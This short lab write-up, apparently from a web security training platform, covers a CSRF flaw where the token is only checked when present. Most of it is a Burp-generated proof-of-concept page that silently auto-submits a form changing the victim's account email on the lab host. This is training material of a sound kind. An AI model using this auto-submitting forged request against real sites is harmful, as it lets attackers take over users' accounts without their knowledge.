# Lab: CSRF where token validation depends on token being present

This is the same as the first lab, but the application doesn't validate CSRF tokens as intended when the token is omitted from a request:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ace41f101f4736cfc08301db0058008c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```